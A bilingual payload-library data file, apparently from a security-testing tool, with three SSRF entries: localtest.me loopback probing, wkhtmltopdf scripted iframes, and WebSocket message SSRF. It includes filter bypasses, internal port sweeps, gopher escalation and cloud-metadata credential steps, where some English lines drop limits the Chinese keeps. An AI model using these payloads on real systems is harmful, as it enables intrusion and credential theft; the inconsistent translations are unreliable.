prerequisites.en: Confirm that localtest.me currently resolves to loopback and record any hosts or DNS overrides on the test machine.

prerequisites.zh: 仅开放一个本地标记端口，并能证明请求由后端 URL 获取器而不是操作者浏览器发送。
prerequisites.en: Open only one local marker port and prove that requests come from the backend URL fetcher rather than the operator's browser.

description.zh: 逐条请求 localtest.me 端口变体并记录响应；成功时域名解析到 127.0.0.1 且对应端口返回服务响应。
description.en: Request each localtest.me port variant and record responses; the domain resolving to 127.0.0.1 with the service response returned on the corresponding port confirms success.

analysis.zh: 阳性是仅拒绝 localhost 字符串的规则允许 localtest.me，随后后端连接回环标记服务。DNS 回环解析本身、关闭端口的错误差异、或前端预览请求都不构成服务端访问。
analysis.en: Positive evidence is a localhost-string rule allowing localtest.me followed by a backend connection to the loopback marker. Loopback DNS resolution alone, errors from a closed port, or a frontend preview request does not constitute server-side access.

opsecTips.zh: 标记端口收到一次后端请求即停止，不继续尝试列表中的数据库端口。
opsecTips.en: Stop when the marker port receives one backend request and do not continue to the listed database ports.

opsecTips.zh: 关闭本地服务，清理 DNS 与应用 URL 缓存，并删除测试令牌和回环访问日志。
opsecTips.en: Close the local service, clear DNS and application URL caches, and delete test tokens and loopback access logs.

description.zh: 绕过对回环别名域名的端口形态限制：直接携带内部路径探测；元数据或服务响应返回即成功。
description.en: Carry internal paths on the loopback alias past port-form assumptions; metadata or service responses returning confirm success.

description.zh: 绕过对全小写无尾点域名的精确匹配：大小写与尾点均不影响解析；端口指纹差异可辨即成功。
description.en: Mutate case and append the trailing dot without affecting resolution; distinguishable port fingerprints confirm success.

description.zh: 绕过仅覆盖 IPv4 别名的规则：改用系统 IPv6 本机别名解析；服务可达即成功。
description.en: Resolve via the system IPv6 localhost alias against IPv4-only coverage; the service being reachable confirms success.

title.zh: 借保留域名探测本机端口
title.en: Probe local ports via a reserved domain

description.zh: 提交 http://localtest.me:8080；该域名固定解析 127.0.0.1，返回服务响应即借合法域名探测本机端口成功。
description.en: Submit http://localtest.me:8080; the domain always resolves to 127.0.0.1, so a service response means local port probing through a legit-looking name.

title.zh: 保持域名替换端口扫描
title.en: Sweep ports under the same domain

description.zh: 域名保持不变依次替换 80、3306、6379 等端口提交；按错误形态与耗时差异推断本机开放的服务。
description.en: Keep the domain and rotate ports 80, 3306, 6379; error shapes and latency differences infer which local services are open.

title.zh: 衔接协议载荷推进利用

description.zh: 仅在授权深入阶段对已确认存活的服务改投 gopher、dict 等协议载荷继续交互（拿到服务回显即证明可推进到命令执行层）；验证类测试以标记端口一次命中为限，不向数据库端口发送协议载荷。
description.en: Aim gopher and dict payloads at the confirmed-live services; service output pushes the probe into the code-execution stage.

overview.zh: localtest.me 回环域名 SSRF 探测覆盖回环别名域名场景：针对仅拒绝 localhost 字符串的 SSRF 防护，验证解析到 127.0.0.1 的 localtest.me 搭配 8080/3306/6379 端口能否绕过检查命中本机服务。验证维度为一个域名、三个端口变体的对照验证。
overview.en: localtest.me Loopback-Domain SSRF Probe covers loopback-alias domains: against SSRF protection that only rejects the localhost string, verify whether localtest.me — resolving to 127.0.0.1 — with ports 8080/3306/6379 bypasses checks to reach local services. Verification dimensions compare one domain across three port variants.

vulnerability.zh: 根因是安全规则仅匹配 localhost 或 127.0.0.1 字符串而未解析其他域名，任何指向回环的公共域名都可绕过字符串规则；应用应按解析后 IP 判断安全性，而非按域名文本。
vulnerability.en: The root cause is safety rules matching only the localhost or 127.0.0.1 string without resolving other names, so any public domain pointing at loopback bypasses string rules; safety must be judged by the resolved IP, not the domain text.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先离线确认 localtest.me 解析到 127.0.0.1；再选择一个受控本地端口和一个关闭端口作对照，由应用各请求一次并记录连接；本地标记服务收到应用请求且连接地址为回环即确认字符串规则缺口。DNS 解析、端口错误差异或浏览器自行请求都不够。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first confirms offline that localtest.me resolves to 127.0.0.1; then pick one controlled local port and one closed port as controls, requesting each once via the application and recording connections — the local marker service receiving the application request with a loopback connection address confirms the string-rule gap. DNS resolution, port-error differences, or browser-initiated requests are insufficient. Replace placeholders via the global variables menu.

mitigation.zh: 对所有 DNS 结果进行地址分类并阻断回环，不为域名字符串设例外；使用出站允许列表限制端口和目标。修复后用同一正常、阳性和阴性样例回归：回环别名域名被拒绝，合法目标保留。
mitigation.en: Classify all DNS results by address and block loopback with no exceptions for domain strings; restrict ports and targets via an egress allowlist. After the fix, regress with the same positive, negative, and normal samples: loopback-alias domains denied, legitimate targets preserved.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: wkhtmltopdf 脚本化 HTTP Iframe

description.zh: 验证 wkhtmltopdf 在启用 JavaScript 时是否执行 document.write 并由动态 iframe 发起服务端 HTTP 子资源请求。
description.en: Tests whether wkhtmltopdf executes document.write when JavaScript is enabled and makes a server-side HTTP subresource request from the dynamic iframe.

prerequisites.zh: 回环地址在执行前替换为隔离 marker 服务，渲染主机无内部或云元数据路由
prerequisites.en: The loopback address is replaced before execution with an isolated marker service and the renderer has no internal or cloud-metadata routes.

prerequisites.zh: 已记录 wkhtmltopdf 版本、JavaScript 开关、延迟设置和子资源网络日志
prerequisites.en: wkhtmltopdf version, JavaScript setting, delay configuration, and subresource network logs are recorded.

description.zh: 把目标改为无重定向的 marker 端点，只渲染一次并记录脚本执行与 iframe 请求。
description.en: Replace the target with a nonredirecting marker endpoint, render once, and record script execution and the iframe request.

analysis.zh: 完整阳性必须证明 wkhtmltopdf 执行脚本、创建 iframe 并发出带 marker 的 HTTP 请求。任何单一中间信号都不足以把结果定为脚本化 SSRF。
analysis.en: A complete positive proves wkhtmltopdf executed script, created the iframe, and sent the marker-bearing HTTP request. No single intermediate signal is sufficient to classify scripted SSRF.

opsecTips.zh: marker 服务仅记录首包后关闭，禁用重定向、认证和二次引用
opsecTips.en: The marker service records one first packet and closes, with redirects, authentication, and secondary references disabled.

opsecTips.zh: 使用一次性工作目录和短 JavaScript 延迟，任务结束即终止所有子进程
opsecTips.en: Use a disposable working directory and short JavaScript delay and terminate every child process when the job ends.

description.zh: 绕过对整串内网地址与即时注入的静态扫描：拆串延迟重组后再写入框架；渲染时段内请求发出即成功。
description.en: Assemble the URL from split strings after a delay past static scanning; a request issued within the render window confirms success.

description.zh: 绕过对内联脚本与 document.write 的过滤：外部脚本由渲染器自动加载并执行 fetch；内部请求到达即成功。
description.en: Load an external script auto-executed by the renderer past inline-script filtering; an internal request arriving confirms success.

description.zh: 绕过渲染器只捕获首个渲染帧的特征：多轮定时请求跨越时间窗；服务端日志出现多次内部请求即成功。
description.en: Issue interval requests beyond the first captured render frame; multiple internal requests in server logs confirm success.

description.zh: 确认同一 HTML 不创建 iframe 且不访问 marker。
description.en: Confirm the same HTML creates no iframe and does not access the marker.

description.zh: 替换目标后设置短延迟，保存进程和网络跟踪。
description.en: After replacing the target, use a short delay and preserve process and network traces.

description.zh: 匹配 DOM 创建、请求令牌和渲染 PID，确认请求由 wkhtmltopdf 发出。
description.en: Match DOM creation, request token, and renderer PID and confirm wkhtmltopdf sent the request.

title.zh: 关闭脚本或出口后回归
title.en: Regress after disabling script or egress

description.zh: 确认业务静态文档仍可生成而动态内部目标不再访问。
description.en: Confirm business static documents still generate while the dynamic internal destination is no longer accessed.

overview.zh: wkhtmltopdf 脚本化 HTTP Iframe 覆盖动态资源加载场景：针对启用 JavaScript 的 wkhtmltopdf 渲染服务，验证 document.write 动态插入的 iframe 能否触发服务端 HTTP 子资源请求。验证维度涵盖禁用脚本阴性基线、脚本启用复测与一次性 marker 关联三类。
overview.en: wkhtmltopdf Scripted HTTP Iframe covers dynamic resource loading: for wkhtmltopdf rendering services with JavaScript enabled, verify whether document.write-injected iframes trigger server-side HTTP subresource requests. Verification dimensions cover a script-disabled negative baseline, script-enabled retests, and one-time marker correlation.

vulnerability.zh: 根因是利用链存在两个连续前提：JavaScript 必须先被允许执行，随后动态插入的 iframe 才会被渲染器取回；与静态资源引用不同，动态路径把脚本执行与网络访问串联，任一环节被禁用即失效，归因也必须分开。
vulnerability.en: The root cause is two chained conditions: JavaScript must run before the dynamically inserted iframe can be fetched by the renderer; unlike static resource references, the dynamic path serializes script execution with network access — disabling either link kills it, and attribution must be handled separately.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先用禁用 JavaScript 的同一输入建立阴性基线；随后启用脚本并把 iframe 目标改为无重定向的一次性 marker 端点渲染一次，脚本执行日志、动态 iframe 节点与来自渲染进程的 marker 请求按时间关联即确认成立；最后阻断脚本或私网目标复测确认防护。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first establishes a negative baseline with JavaScript disabled on the same input; then enable scripts, point the iframe target at a one-time marker endpoint without redirects, and render once — time-correlated script-execution logs, the dynamic iframe node, and a marker request from the renderer process confirm; finally retest with scripts or private targets blocked to verify protection. Replace placeholders via the global variables menu.

mitigation.zh: 默认禁用 JavaScript；确需脚本时在独立无内部路由容器中运行渲染器，并对所有初始与动态资源执行解析后地址允许列表。修复后用第 1 步样例回归，动态 iframe 请求应被策略拒绝。
mitigation.en: Disable JavaScript by default; where scripting is required, run the renderer in an isolated container without internal routes and apply a resolved-address allowlist to all initial and dynamic resources. After the fix, regress with the step 1 sample: dynamic iframe requests must be denied by policy.

name.zh: WebSocket 驱动的服务端请求伪造

description.zh: 通过 request/fetch/proxy/url/uri/endpoint 等消息字段请求回环、元数据、file 与 gopher 目标，验证 WebSocket 后端是否代发网络或文件请求。
description.en: Uses request, fetch, proxy, url, uri, and endpoint fields for loopback, metadata, file, and gopher targets to test whether a WebSocket backend performs network or file requests.

prerequisites.zh: 已确认某个消息动作会在服务器侧获取 URL，并能区分浏览器自身请求、后端 HTTP 客户端与命令字段执行。
prerequisites.en: Confirm that a message action fetches a URL server-side and distinguish browser requests, backend HTTP clients, and command-field execution.

prerequisites.zh: 部署受控外部与回环标记服务；file、gopher 与云元数据原始目标均替换为无敏感测试资源。
prerequisites.en: Deploy controlled external and loopback marker services and replace source file, gopher, and cloud-metadata targets with nonsensitive test resources.

title.zh: WS SSRF (通过WS代理请求内部服务)
title.en: Validation step 1 for WebSocket-Driven Server-Side Request Forgery

description.zh: 逐条发送 WS 请求调度消息并记录响应与出站日志；成功时服务端代为取回对应 URL 并返回内容，含 file 或 gopher 时确认协议转发。
description.en: Send each WS request-dispatch message and record responses and egress logs; the server fetching the URL and returning content, including file or gopher schemes, confirms protocol forwarding.

analysis.zh: 第 0–23 条与第 28–35 条（0 基序号）是不同字段的 URL/scheme SSRF 候选；第 24–27 条的 command= curl/wget 只有在服务器执行完整命令时才是命令执行路径，不能仅凭字符串报告 RCE 或 SSRF。成功必须是服务端实际出站到受控目标，file/gopher/元数据行不能作为初始证明。
analysis.en: Lines 0-23 and 28-35 are URL or scheme SSRF candidates across fields. Command lines 24-27 become command-execution paths only if the server runs the complete curl or wget command; the string alone proves neither RCE nor SSRF. Success requires actual server egress to a controlled target, and file, gopher, or metadata lines are not initial proof.

opsecTips.zh: 首次收到后端回环标记请求后停止，不访问云凭据、真实内部端口、系统文件或 Redis 命令。
opsecTips.en: Stop after the first backend request reaches the loopback marker and do not access cloud credentials, real internal ports, system files, or Redis commands.

opsecTips.zh: 关闭标记服务与 WebSocket，清除 DNS/HTTP 缓存和重试队列，删除消息及出站日志中的内部 URL。
opsecTips.en: Close marker services and the WebSocket, clear DNS and HTTP caches and retry queues, and remove internal URLs from messages and egress logs.

description.zh: 绕过对帧内明文 URL 的扫描：斜杠转义为 \/ 由 JSON 解码还原；服务端发出内部请求即成功。
description.en: Escape slashes for JSON-decoded restoration past plaintext frame scanning; the server issuing an internal request confirms success.

wafBypass.command:
// 帧1 (opcode=text, FIN=0): {"type":"request","url":"http://127
// 帧2 (opcode=0 continuation, FIN=1): .0.0.1/"}

description.zh: 绕过按完整帧匹配的检测：把消息拆成续帧序列，重组后才含完整 URL；服务端仍处理请求即成功。
description.en: Deliver the message as fragmented continuation frames reassembled past whole-frame matching; the server still processing the request confirms success.

title.zh: 短格式回环与字段变体

description.zh: 绕过对 127.0.0.1 与小写 type 键的固定匹配：缩写回环与 IPv6 加键名变形组合；内部响应返回即成功。
description.en: Combine abbreviated loopback, IPv6, and key-case variants past fixed matching; an internal response returning confirms success.

title.zh: 建立 WebSocket 驱动服务端请求

description.zh: 连接目标 WebSocket 后发送 {"type":"request","url":"http://127.0.0.1/"} 消息；服务端返回对应响应体即 WS 消息可充当 SSRF 通道。
description.en: Connect to the target's WebSocket and send a {"type":"request","url":"http://127.0.0.1/"} message; the server returning the fetched body makes WS messages an SSRF channel.

title.en: Sweep the intranet by template swaps

description.zh: 沿用第 1 步消息模板替换 8080、3306、6379 等端口与内网 IP；按返回 banner 差异绘制内网服务地图。
description.en: Reuse the step-1 message template with ports 8080, 3306, 6379 and intranet IPs; banner differences map the internal services.

title.zh: 深入云元数据窃取凭证

description.zh: 在授权深入阶段把 url 字段换成云元数据 iam/security-credentials 路径以证明影响（返回角色名或凭据键名即表明 WS 通道可拖取实例角色凭证）；验证类测试不读取 AccessKeyId 正文，元数据行不作为初始证明。
description.en: Swap the url field to the iam/security-credentials metadata path; AccessKeyId in the response completes cloud credential theft over the WS channel.

attackChain.payload:
// 帧1 (opcode=text, FIN=0): {"type":"request","url":"http://127
// 帧2 (opcode=0 continuation, FIN=1): .0.0.1/"}

overview.zh: WebSocket 驱动的服务端请求伪造覆盖 WS 消息调度场景：针对经 WebSocket 接收 request/fetch/proxy/url 等字段的后端，验证回环、元数据、file 与 gopher 目标能否被服务器代为访问。验证维度涵盖外部标记确认、逐字段测试与出站日志关联三类。
overview.en: WebSocket-Driven Server-Side Request Forgery covers WS-message dispatch: for backends accepting request/fetch/proxy/url fields over WebSocket, verify whether loopback, metadata, file, and gopher targets get fetched by the server. Verification dimensions cover external-marker confirmation, per-field testing, and egress-log correlation.

vulnerability.zh: 根因是 WebSocket 消息中的 URL 或目标未经协议、解析后地址与重定向校验，worker 以服务器网络身份访问内部资源；command 字段若被 Shell 执行需另按 RCE 证据判断，风险必须落到实际消息 sink 与后端资源。
vulnerability.en: The root cause is URLs or targets inside WebSocket messages unvalidated for scheme, resolved address, or redirects while workers reach internal resources with the server's network identity; command fields executed by a shell must instead be judged under RCE evidence, and risk must land on actual message sinks and backend resources.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先用外部标记确认后端会按消息发起请求；再选一个回环标记 URL 逐字段测试（type:request、fetch、proxy 等），阳性要求后端客户端/出站代理与目标服务记录同一令牌；含 file 或 gopher 的消息确认协议转发。不触碰元数据、真实文件或 Redis。WebSocket ACK、浏览器请求、连接超时或 command 字符串被存储都不够。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first confirms the backend fetches per message via an external marker; then test a loopback marker URL field by field (type:request, fetch, proxy, etc.) — a positive requires the backend client/egress proxy and target service recording the same token; messages carrying file or gopher confirm protocol forwarding. Never touch metadata, real files, or Redis. WebSocket ACKs, browser requests, connection timeouts, or stored command strings are insufficient. Replace placeholders via the global variables menu.

mitigation.zh: 对动作与字段做 schema 允许列表，仅允许 HTTPS 目标；解析后阻断内网、回环与链路本地，禁用 file/gopher 并在重定向后重检。修复后重放相同对照，合法 WebSocket 功能保留而越权取回能力消失。
mitigation.en: Apply schema allowlists over actions and fields, allowing only HTTPS targets; block intranets, loopback, and link-local after resolution, disable file/gopher, and recheck after redirects. After the fix, replay the same controls: legitimate WebSocket features remain while unauthorized fetching disappears.
